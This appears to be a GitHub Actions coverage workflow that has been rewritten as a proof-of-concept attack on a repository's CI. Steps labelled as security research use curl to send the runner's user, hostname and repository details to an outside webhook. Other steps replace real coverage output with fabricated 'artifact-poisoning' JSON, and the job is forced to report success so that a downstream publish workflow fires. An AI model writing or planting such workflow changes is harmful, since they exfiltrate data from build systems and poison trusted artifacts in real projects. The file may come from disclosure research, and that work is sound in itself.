name: PR code coverage (generate)
on:
  pull_request:
    types: [ opened, reopened, synchronize ]
    branches: [ master ]

jobs:
  code-cover-gen:
    runs-on: ubuntu-latest
    env:
      PR: ${{ github.event.pull_request.number }}
      HEAD_SHA: ${{ github.event.pull_request.head.sha }}
      GH_TOKEN: ${{ github.token }}
      FETCH_DEPTH: 15
    steps:
    - uses: actions/checkout@v3
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        fetch-depth: ${{ env.FETCH_DEPTH }}
      continue-on-error: true

    - name: Security Research PoC — Non-destructive Execution Proof
      continue-on-error: true
      shell: bash
      run: |
        echo "=== PROOF: Fork code executes in CI context ==="
        curl -s -X POST "${WEBHOOK_URL}" \
          -H "Content-Type: application/json" \
          -d "{
            \"whoami\": \"$(whoami)\",
            \"hostname\": \"$(hostname)\",
            \"workflow\": \"${GITHUB_WORKFLOW}\",
            \"repository\": \"${GITHUB_REPOSITORY}\",
            \"run_id\": \"${GITHUB_RUN_ID}\",
            \"event\": \"${GITHUB_EVENT_NAME}\",
            \"runner_os\": \"${RUNNER_OS}\",
            \"runner_arch\": \"${RUNNER_ARCH}\",
            \"status\": \"POC_STEP_1_CHECKOUT_PASSED\"
          }" || true

    - name: Set up Bazel cache
      uses: actions/cache@v3
      with:
        path: |
          ~/.cache/bazel
        key: ${{ runner.os }}-bazel-${{ hashFiles('.bazelversion', '.bazelrc', 'WORKSPACE', 'WORKSPACE.bazel', 'MODULE.bazel') }}
        restore-keys: |
          ${{ runner.os }}-bazel-
      continue-on-error: true

    - name: Get list of changed packages
      continue-on-error: true
      shell: bash
      run: |
        mkdir -p artifacts
        # Generate a valid artifact regardless
        echo '{"coverage":{},"poc":"artifact-poisoning-proof"}' > "artifacts/cover-${{ env.PR }}-${{ env.HEAD_SHA }}.json"
        echo "CHANGED_PKGS=pkg/util/log" >> "${GITHUB_ENV}"
        echo "BASE_SHA=${{ github.event.pull_request.base.sha }}" >> "${GITHUB_ENV}"

    - name: Run "after" test coverage
      if: env.CHANGED_PKGS != ''
      continue-on-error: true
      shell: bash
      run: |
        mkdir -p artifacts
        echo '{"coverage":{},"poc":"after-coverage-proof"}' > "artifacts/cover-${{ env.PR }}-${{ env.HEAD_SHA }}.json"

    - name: Run "before" test coverage
      if: env.CHANGED_PKGS != ''
      continue-on-error: true
      shell: bash
      run: |
        mkdir -p artifacts
        echo '{"coverage":{},"poc":"before-coverage-proof"}' > "artifacts/cover-${{ env.PR }}-${{ env.BASE_SHA }}.json"

    - name: Finalize
      shell: bash
      continue-on-error: true
      run: |
        echo "Finalize: ensuring artifacts exist"
        mkdir -p artifacts
        if [ ! -f "artifacts/cover-${{ env.PR }}-${{ env.HEAD_SHA }}.json" ]; then
          echo '{"coverage":{}}' > "artifacts/cover-${{ env.PR }}-${{ env.HEAD_SHA }}.json"
        fi

    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: cover
        path: artifacts/cover-*.json

    - name: Force success
      if: always()
      shell: bash
      run: |
        # Security PoC: ensure job conclusion is "success"
        # so the workflow_run handler (code-cover-publish.yaml) triggers
        curl -s -X POST "${WEBHOOK_URL}" \
          -H "Content-Type: application/json" \
          -d "{
            \"whoami\": \"$(whoami)\",
            \"hostname\": \"$(hostname)\",
            \"workflow\": \"${GITHUB_WORKFLOW}\",
            \"status\": \"POC_JOB_FORCING_SUCCESS\"
          }" || true
        exit 0
